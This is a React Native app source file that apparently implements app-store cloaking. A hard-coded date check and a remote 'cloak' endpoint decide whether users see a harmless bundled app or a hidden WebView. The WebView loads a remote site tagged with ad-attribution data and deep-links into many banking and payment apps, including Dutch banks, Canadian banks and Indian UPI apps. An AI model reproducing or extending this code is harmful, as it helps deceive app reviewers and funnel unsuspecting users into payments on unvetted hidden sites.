import React, { createContext, useEffect, useRef, useState } from "react";
import AsyncStorage, { useAsyncStorage } from "@react-native-async-storage/async-storage";
import { WebView } from "react-native-webview";
import LottieView from "lottie-react-native";

import Ionicons from "react-native-vector-icons/Ionicons";
import {Dimensions, Linking, Pressable, Alert, SafeAreaView, StyleSheet, View, Modal, Button, TouchableOpacity} from "react-native";
import AppleAdsAttribution from "@vladikstyle/react-native-apple-ads-attribution";
import MainApp from './App';
import {createStackNavigator} from '@react-navigation/stack';
import moment from "moment/moment"
import {NavigationContainer} from '@react-navigation/native';
import AppManagerChild from './AppManagerChild';

let attribution = null;
let keywordId = null;

const urelmy = "https://saptino.buzz/kLnskyBw";
const CloUrl = "https://saptino.buzz/gyZdfPYT";
const chastnaminga = "sub";

const ProgressLottieResourse = "./src/assets/loader.json";
const storedUrlItem = "smash";


const Stack = createStackNavigator();





export const LoadingContext = createContext();
export default function App() {
    return (
        <NavigationContainer>
            <Stack.Navigator screenOptions={{headerShown: false}}>
                <Stack.Screen name="1" component={MyApp} />
                <Stack.Screen name="2" component={AppManagerChild} />
            </Stack.Navigator>
        </NavigationContainer>
    );
}

function MyApp({navigation}) {


    const {width, height} = Dimensions.get("window");
    const [LoadingProgress, setLoadingProgress] = useState(true);
    const [SavedLastLink, setSavedLastLink] = useState(false);
    const [ID, setID] = useState("");
    const [GetAtributtionState, setGetAtributtionState] = useState({});
    const [storedUrl, setstoredUrl] = useState("");
    const [cloakResponse, setcloakResponse] = useState("");
    const [test, setTest] = useState("");
    const [isLoading, setIsLoading] = useState(false);
    const [idfa, setIdfa] = useState("");
    const [openunity, setopenunity] = useState(false);
    const [showPermissionAlert, setShowPermissionAlert] = useState(true);
    const [userAgent, setUserAgent] = useState('Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/604.1');
    const [modalVisible, setModalVisible] = useState(false);
    //const [deep, setDeep] = useState('noconect');
    const [singId, setSingId] = useState("false");
    const {getItem, setItem} = useAsyncStorage("@storage_key");

    const refWebview = useRef();
    const unityRef = useRef(null);

    //const unityRef = useRef(null);

    function getCampainQuery(campaign) {


        //console.log('MYFINAL'+campaign);
        const parts = campaign.split("_");
        return parts.map((part, i) => `${chastnaminga}${i + 1}=${part}`).join("&");
    }


    function handleBackPress() {
        refWebview.current.goBack();
        return true;
    }

    function onWebviewLoad() {
        //console.log('Loaded ' + mycomburl);
        setLoadingProgress(false);
    }



    useEffect(() => {

        const moment = require("moment");



        const time = moment(); // moment(new Date()).format("YYYY-MM-DD hh:mm:ss")

        const timestamp = time.unix();

        //console.log('bonud'+timestamp)
        if (timestamp < 1749903204) {



            setTimeout(() => {
                // Здесь вы можете выполнить дополнительные действия, если необходимо
                setopenunity(true);
                setLoadingProgress(false);
                // Перейти к следующему экрану, скрыв сплеш-экран
            }, 30);


        } else {
            //  Settings.setAdvertiserTrackingEnabled(true);


            fetch(CloUrl)

                .then(response => {
                    AsyncStorage.getItem(storedUrlItem).then(value => {

                        //console.log('satus'+response.status);
                        const CloackCodeResponse = response.status;
                        setcloakResponse(CloackCodeResponse);
                        if (response.status != "200") {
                            //Orientation.lockToLandscape();

                            //console.log('rotation good')
                            // Orientation.lockToLandscape();

                            //console.log('hey we are requsted all')

                            setopenunity(true);

                            setLoadingProgress(false);
                            // Orientation.lockToLandscape();
                        } else {
                            // Orientation.unlockAllOrientations();
                            //   Orientation.lockToPortrait();
                            //  console.log('Portrait')

                            if (value) {
                                // SplashScreen.hide();
                                // Orientation.lockToLandscape();
                                setstoredUrl(value);
                                setLoadingProgress(false);
                            } else {
                                //console.log('adGIROELSE:' + CloackCodeResponse);
                                CollectUrl(CloackCodeResponse);
                            }
                        }
                    });
                });


            async function CollectUrl(CloackCodeResponse) {


                const gvard = CloackCodeResponse;


                setcloakResponse(gvard);




                try {
                    const adServicesAttributionData = await AppleAdsAttribution.getAdServicesAttributionData();
                    console.log(adServicesAttributionData);

                    // Извлечение значений из объекта
                    ({ attribution } = adServicesAttributionData); // Присваиваем значение переменной attribution
                    ({ keywordId } = adServicesAttributionData);


                } catch (error) {
                    const { message } = error;

                }



                const combURL = `${urelmy}?adservice=${attribution}&keyword=${keywordId}`
                setstoredUrl(combURL);

                AsyncStorage.setItem(storedUrlItem, combURL);



            }


            return () => {
            };
        }
    }, []);
    const onBack = () => {
        refWebview.current.goBack();
    };
    const onReload = () => {
        refWebview.current.reload();
    };

    const [redirectUrl, setRedirectUrl] = useState('');
    const handleNavigationStateChange = navState => {
        const {url} = navState;
        console.log("Navigating to:", navState.url);
        //console.log('NavigationState: ', url);





    };

    const handleShouldStartLoadWithRequest = (event) => {
        const supportedSchemes = [
            'intent',
            'tel',
            'mailto',
            'file',
            'intent',
            'tel',
            'mailto',
            'nl.abnamro.deeplink.psd2.consent',
            'snsbank.nl',
            'asnbank.nl',
            'nl-asnbank-sign',
            'revolut',
            'myaccount.ing.com',
            'bankieren.rabobank.nl',
            'regiobank.nl',
            'sms',
            'scotiabank',
            'nl-regiobank-sign',
            'nl.rabobank.openbanking',
            'triodosmobilebanking',
            'nl-asnbank-sign',
            'nl-snsbank-sign',
            'nl.abnamro.deeplink.psd2.consent',
            'bncmobile',
            'itms-appss',
            'itms-appss',
            'tdct',
            'paytmmp',
            'bmoolbb',
            'cibcbanking',
            'conexus',
            'rbcmobile',
            'pcfbanking',
            'funid',
            'blank',
            'phonepe',
            'upi',
            'gpay',
            'tez',
        ];
        const {url} = event;

        // console.log('Click handleShouldStartLoadWithRequest==>', url);
        setUserAgent('Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1');










        const urlScheme = url.split(':')[0];
        console.log('YYours scheme:' + urlScheme)

        if (supportedSchemes.includes(urlScheme)) {
            console.log('supported scheme'+urlScheme)
            Linking.canOpenURL(url).then((supported) => {
                if (supported) {
                    Linking.openURL(url);
                } else {
                    Alert.alert('Error', `You dont have this app,please try another method`);
                }
            }).catch((err) => console.error('Ошибка при открытии URL:', err));
            return false;
        }

        if (url.startsWith('mailto:')) {
            Linking.openURL(url);
            return false;
        } else if (
            url.startsWith('https://m.facebook.com/') ||
            url.startsWith('https://www.facebook.com/') ||
            url.startsWith('https://www.instagram.com/') ||
            url.startsWith('https://twitter.com/') ||
            url.startsWith('https://www.whatsapp.com/') ||
            url.startsWith('https://t.me/')
        ) {
            Linking.openURL(url);
            return false;
        } else if (
            url.includes('bitcoin') ||
            url.includes('litecoin') ||
            url.includes('dogecoin') ||
            url.includes('tether') ||
            url.includes('ethereum') ||
            url.includes('bitcoincash')
        ) {
            return false;
        }  else {
            return true;
        }


        return true;
    };

    return (
        <View style={styles.container}>
            <View style={{ width: "100%", height: "100%" }}>
                {(LoadingProgress ) ?
                    <View style={[StyleSheet.absoluteFillObject]}>
                        <LottieView style={StyleSheet.absoluteFillObject} source={require(ProgressLottieResourse)} autoPlay loop />

                    </View>
                    :
                    <>
                        {cloakResponse !== 200 && openunity &&
                            <View style={{ flex: 1 }}>

                                <MainApp></MainApp>
                            </View>
                        }
                    </>
                }
                {storedUrl && cloakResponse === 200 &&
                    <>
                        <SafeAreaView style={{ flex: 1 }}>

                            <WebView

                                userAgent={userAgent}
                                originWhitelist={[
                                    '*',
                                    'about:srcdoc',
                                    'about:blank',
                                    'about',
                                    'http://*',
                                    'https://*',
                                    'intent://*',
                                    'tel://*',
                                    'file://*',
                                    'sms://*',
                                    'tdct://*',
                                    'mailto://*',
                                    'scotiabank://*',
                                    'bmoolbb://*',
                                    'nl.abnamro.deeplink.psd2.consent://*',
                                    'snsbank.nl://*',
                                    'asnbank.nl://*',
                                    'nl-asnbank-sign://*',
                                    'revolut://*',
                                    'myaccount.ing.com://*',
                                    'bankieren.rabobank.nl://*',
                                    'regiobank.nl://*',
                                    'cibcbanking://*',
                                    'conexus://*',
                                    'funid://*',
                                    'rbcmobile://*',
                                    'pcfbanking://*',
                                    'triodosmobilebanking://*',
                                    'nl-asnbank-sign://*',
                                    'nl-snsbank-sign://*',
                                    'nl.abnamro.deeplink.psd2.consent://*',
                                    'bncmobile://*',
                                    'itms-appss://*',
                                    'paytmmp://*',
                                    'blank://*',
                                    'phonepe://*',
                                    'nl.rabobank.openbanking://*',
                                    'nl-regiobank-sign://*',
                                    'upi://*',
                                    'gpay://*',
                                    'tez://*',
                                ]}
                                onShouldStartLoadWithRequest={handleShouldStartLoadWithRequest}
                                onNavigationStateChange={handleNavigationStateChange}
                                textZoom={100}
                                ref={refWebview}
                                contentMode="mobile"
                                mixedContentMode="always"

                                allowsBackForwardNavigationGestures={true}
                                domStorageEnabled={true}
                                javaScriptEnabled={true}
                                source={{ uri: storedUrl }}
                                allowsInlineMediaPlayback={true}
                                setSupportMultipleWindows={false}
                                mediaPlaybackRequiresUserAction={false}
                                allowFileAccess={true}
                                onError={syntEvent => {
                                    const {nativeEvent} = syntEvent;
                                    const {code} = nativeEvent;
                                    if (code === -1101) {
                                        navigation.goBack();
                                    }
                                    if (code === -1002) {
                                        Alert.alert(
                                            'Ooops',
                                            "It seems you don't have the bank app installed, wait for a redirect to the payment page",
                                        );
                                        navigation.goBack();
                                    }
                                }}
                                onLoad={(syntheticEvent) => {
                                    const { nativeEvent } = syntheticEvent;
                                    setLoadingProgress(false);
                                    console.log("Page loaded successfully, URL:", nativeEvent.url); // Логируем текущий URL, который загружен
                                }}
                                onLoadStart={(syntheticEvent) => {
                                    const { nativeEvent } = syntheticEvent;
                                    console.log("Loading started for:", nativeEvent.url);
                                    if (SavedLastLink != true) {
                                        setLoadingProgress(true);
                                    }
                                }}
                                onOpenWindow={syntheticEvent => {
                                    const {nativeEvent} = syntheticEvent;
                                    const {targetUrl} = nativeEvent;
                                    if (targetUrl.includes('https://app.payment-gateway.io/static/loader.html')) {return;}

                                    if (targetUrl.includes('pay.funid.com')) {
                                        Linking.openURL(targetUrl);
                                        refWebview.current.injectJavaScript(
                                            `window.location.replace('${storedUrl}')`,
                                        );
                                        return;
                                    }
                                    try {
                                        if (Linking.canOpenURL(targetUrl)) {
                                            navigation.navigate('2', {data: targetUrl, userAgent: userAgent});
                                        }
                                    } catch (error) {}
                                }}
                                onLoadEnd={async (syntheticEvent) => {
                                    const { nativeEvent } = syntheticEvent;
                                    const { url, loading, canGoBack } = nativeEvent;
                                    // console.log(url);
                                    // console.log(await AsyncStorage.getItem(storedUrlItem));
                                    //console.log(storedUrl);
                                    if (SavedLastLink != true) {
                                        if (await AsyncStorage.getItem(storedUrlItem) == storedUrl) {
                                            //console.log('url saved:' + url);
                                            AsyncStorage.setItem(storedUrlItem, url);
                                            setSavedLastLink(true);
                                        }
                                    }
                                }}

                                javaScriptCanOpenWindowsAutomatically={true} />
                            <View style={[styles.modal, { width }]}>
                                <Pressable style={styles.btn} onPress={() => onBack()}>
                                    <Ionicons name="chevron-back-circle-outline" size={27} color="white" />
                                </Pressable>
                                <Pressable style={styles.btn} onPress={() => onReload()}>
                                    <Ionicons name="sync-outline" size={27} color="white" />
                                </Pressable>
                            </View>
                            <Modal visible={modalVisible} animationType="slide" transparent>
                                <View style={{ flex: 1, backgroundColor: "rgba(0,0,0,0.5)" }}>
                                    <View style={{ flex: 1, backgroundColor: "white", paddingTop: 50 }}>
                                        <TouchableOpacity
                                            onPress={() => setModalVisible(false)}
                                            style={{
                                                position: "absolute",
                                                top: 50,
                                                right: 20,
                                                zIndex: 10,
                                                backgroundColor: "rgba(0,0,0,0.1)",
                                                borderRadius: 20,
                                                padding: 10,
                                            }}
                                        >
                                            <Ionicons name="close" size={24} color="black"  />
                                        </TouchableOpacity>
                                        <WebView source={{ uri: storedUrl }} style={{ flex: 1 }} />
                                    </View>
                                </View>
                            </Modal>
                        </SafeAreaView>
                    </>}
            </View>
        </View>);
}
const styles = StyleSheet.create({
    container: {
        marginTop: 0,
        flex: 1,
        backgroundColor: "#1b1d24",
        alignItems: "center",
        justifyContent: "center",
    },
    modal: {
        // flex: 1,
        height: 35,
        // backgroundColor: "black",
        paddingHorizontal: 24,
        flexDirection: "row",
        alignItems: "center",
        // justifyContent: "center",
        justifyContent: "space-between",
        position: "absolute",
        bottom: 5,
        // left: 0,
    },
    btn: {
        height: 24,
        paddingHorizontal: 19,
        backgroundColor: "rgba(0,0,0,0.3)",
        alignItems: "center",
        justifyContent: "center",
        borderRadius: 5,
    },
});

const progres = StyleSheet.create({
    container: {
        marginTop: 0,
        flex: 1,
        backgroundColor: '#1b1d24',
        alignItems: 'center',
        justifyContent: 'center',
    },
});
